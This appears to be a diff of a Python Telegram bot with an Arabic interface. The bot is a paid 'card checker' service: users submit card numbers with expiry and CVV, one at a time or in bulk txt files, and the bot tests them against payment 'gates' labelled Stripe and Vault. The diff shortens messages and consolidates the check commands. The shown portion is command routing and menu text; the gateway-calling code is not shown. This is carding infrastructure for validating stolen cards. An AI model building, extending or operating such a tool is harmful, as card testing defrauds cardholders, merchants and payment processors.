-                plans = "\n".join([f"• {p['name']}: {p['price']}" for p in SUBSCRIPTION_PLANS.values()])
-                text = f"💎 <b>خطط الاشتراك</b>\n{plans}\n\nللاشتراك: {DEV_CONTACT}"
-                bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
-                                     parse_mode='HTML', reply_markup=UserInterface.back_button())
+            self.handler.handle_subscribe(call.message)
         
         elif data == "default_gate":
             self.handler.handle_default_gate(call.message)
@@ -2120,16 +1504,13 @@ class CallbackHandler:
         elif data == "set_delay":
             current_delay = DataManager.load_settings().get("delay_between_cards", 5)
             bot.edit_message_text(
-                f"⏱️ <b>ضبط المدة بين البطاقات</b>\n━━━━━━━━━━━━\nالمدة الحالية: {current_delay} ثانية\n\nأرسل الأمر: <code>/delay 5</code>\n(المدة من 1 إلى 30 ثانية)",
-                call.message.chat.id,
-                call.message.message_id,
-                parse_mode='HTML',
-                reply_markup=UserInterface.back_button()
+                f"⏱️ المدة الحالية: {current_delay} ثانية\n\nأرسل: <code>/delay 5</code>",
+                call.message.chat.id, call.message.message_id,
+                parse_mode='HTML', reply_markup=UserInterface.back_button()
             )
         
         elif data == "mass_check":
-            bot.edit_message_text("📁 أرسل ملف txt بالبطاقات\nسيتم فحص جميع البطاقات تلقائياً\n\n💡 بعد إرسال الملف، يمكنك استخدام /st1m أو /st2m أو /chkm لفحص آخر ملف",
-                                 call.message.chat.id, call.message.message_id,
+            bot.edit_message_text("📁 أرسل ملف txt بالبطاقات", call.message.chat.id, call.message.message_id,
                                  reply_markup=UserInterface.back_button())
         
         elif data == "check_last_file":
@@ -2144,12 +1525,12 @@ class CallbackHandler:
             gate = data.replace("gate_", "")
             bot.edit_message_text(f"✅ {GATES[gate]['icon']} {GATES[gate]['name']}\nأرسل: <code>/{GATES[gate]['command']} رقم|شهر|سنة|cvv</code>",
                                   call.message.chat.id, call.message.message_id,
-                                  parse_mode='HTML', reply_markup=UserInterface.back_button("gates_menu"))
+                                  parse_mode='HTML', reply_markup=UserInterface.back_button())
         
         elif data.startswith("stop_"):
             cid = int(data.replace("stop_", ""))
             self.handler.mass_manager.stop_check(cid)
-            bot.answer_callback_query(call.id, "⛔ جاري إيقاف الفحص...")
+            bot.answer_callback_query(call.id, "⛔ جاري الإيقاف")
 
 # ==================== إعداد البوت ====================
 def setup():
@@ -2162,12 +1543,7 @@ def setup():
     def start(m): handler.handle_start(m)
     
     @bot.message_handler(commands=['help'])
-    def help(m): 
-        chat_type = Helpers.get_chat_type(m.chat.id)
-        if chat_type == "private":
-            bot.reply_to(m, "📚 أرسل البطاقة مباشرة أو استخدم /start للقائمة الرئيسية")
-        else:
-            bot.reply_to(m, f"📚 أرسل البطاقة مع منشن البوت: <code>@{BOT_USERNAME} 4111111111111111|12|25|123</code>", parse_mode='HTML')
+    def help(m): bot.reply_to(m, "📚 استخدم /start للقائمة الرئيسية")
     
     @bot.message_handler(commands=['stop'])
     def stop(m): handler.handle_stop(m)
@@ -2196,23 +1572,17 @@ def setup():
     @bot.message_handler(commands=['removesub'])
     def removesub(m): handler.handle_remove_sub(m)
     
-    @bot.message_handler(commands=['st1'])
-    def stripe1(m): handler.handle_single(m, 'stripe1')
+    @bot.message_handler(commands=['st'])
+    def stripe(m): handler.handle_single(m, 'stripe')
     
-    @bot.message_handler(commands=['st1m'])
-    def stripe1_mass(m): handler.handle_mass(m, 'stripe1')
-    
-    @bot.message_handler(commands=['st2'])
-    def stripe2(m): handler.handle_single(m, 'stripe2')
-    
-    @bot.message_handler(commands=['st2m'])
-    def stripe2_mass(m): handler.handle_mass(m, 'stripe2')
+    @bot.message_handler(commands=['mass'])
+    def stripe_mass(m): handler.handle_mass(m, 'stripe')
     
     @bot.message_handler(commands=['chk'])
-    def real(m): handler.handle_single(m, 'real')
+    def vault(m): handler.handle_single(m, 'vault')
     
     @bot.message_handler(commands=['chkm'])
-    def real_mass(m): handler.handle_mass(m, 'real')
+    def vault_mass(m): handler.handle_mass(m, 'vault')
     
     @bot.message_handler(content_types=['document'])
     def handle_document(m):
@@ -2236,11 +1606,11 @@ def setup():
             if len(cards) == 1:
                 handler.check_single_card(m, cards[0], DataManager.get_user_default_gate(m.from_user.id))
             else:
-                bot.reply_to(m, f"📝 تم العثور على {len(cards)} بطاقة في النص\n🔄 جاري بدء الفحص المتسلسل...")
+                bot.reply_to(m, f"📝 {len(cards)} بطاقة\n🔄 جاري الفحص...")
                 handler.check_multiple_cards(m, cards, DataManager.get_user_default_gate(m.from_user.id))
         else:
             if Helpers.get_chat_type(m.chat.id) == "private":
-                bot.reply_to(m, "⚠️ أمر غير معروف\n\n💡 يمكنك إرسال البطاقة مباشرة بالصيغة:\n<code>4111111111111111|12|25|123</code>\n\nأو إرسال ملف txt للفحص التلقائي",
+                bot.reply_to(m, "⚠️ أمر غير معروف\n\nأرسل البطاقة: <code>4111111111111111|12|25|123</code>",
                             parse_mode='HTML', reply_markup=UserInterface.main_menu("private"))
     
     @bot.callback_query_handler(func=lambda c: True)
@@ -2249,28 +1619,23 @@ def setup():
     def run_health():
         port = int(os.environ.get('PORT', 10000))
         with socketserver.TCPServer(("0.0.0.0", port), http.server.SimpleHTTPRequestHandler) as httpd:
-            print(f"🌐 Health check on {port}")
             httpd.serve_forever()
     
     threading.Thread(target=run_health, daemon=True).start()
     
     print(Fore.GREEN + "🚀 البوت يعمل..." + Style.RESET_ALL)
-    print(Fore.CYAN + "=" * 60 + Style.RESET_ALL)
-    print(Fore.YELLOW + "📌 البوابات المتاحة:" + Style.RESET_ALL)
-    print(Fore.WHITE + "   💳 Stripe v1: /st1 (فردي) | /st1m (ملف)" + Style.RESET_ALL)
-    print(Fore.WHITE + "   💎 Stripe v2: /st2 (فردي) | /st2m (ملف)" + Style.RESET_ALL)
-    print(Fore.WHITE + "   🔥 Real Check: /chk (فردي) | /chkm (ملف)" + Style.RESET_ALL)
-    print(Fore.CYAN + "=" * 60 + Style.RESET_ALL)
-    print(Fore.YELLOW + "📌 الأوامر الإضافية:" + Style.RESET_ALL)
-    print(Fore.WHITE + "   /stop - إيقاف الفحص الحالي" + Style.RESET_ALL)
-    print(Fore.WHITE + "   /delay - عرض أو تغيير المدة بين البطاقات" + Style.RESET_ALL)
-    print(Fore.WHITE + "   /lastfile - فحص آخر ملف تم إرساله" + Style.RESET_ALL)
-    print(Fore.CYAN + "=" * 60 + Style.RESET_ALL)
-    print(Fore.GREEN + "✅ البوت جاهز للعمل!" + Style.RESET_ALL)
+    print(Fore.CYAN + "=" * 50 + Style.RESET_ALL)
+    print(Fore.YELLOW + "📌 الأوامر:" + Style.RESET_ALL)
+    print(Fore.WHITE + "   💳 /st - فحص فردي (Stripe)" + Style.RESET_ALL)
+    print(Fore.WHITE + "   📁 /mass - فحص ملف (Stripe)" + Style.RESET_ALL)
+    print(Fore.WHITE + "   ⚡ /chk - فحص فردي (Vault)" + Style.RESET_ALL)
+    print(Fore.WHITE + "   📁 /chkm - فحص ملف (Vault)" + Style.RESET_ALL)
+    print(Fore.WHITE + "   ⛔ /stop - إيقاف الفحص" + Style.RESET_ALL)
+    print(Fore.CYAN + "=" * 50 + Style.RESET_ALL)
+    print(Fore.GREEN + "✅ البوت جاهز!" + Style.RESET_ALL)
     
     bot.infinity_polling()
 
-# ==================== التشغيل ====================
 if __name__ == "__main__":
     try:
         setup()
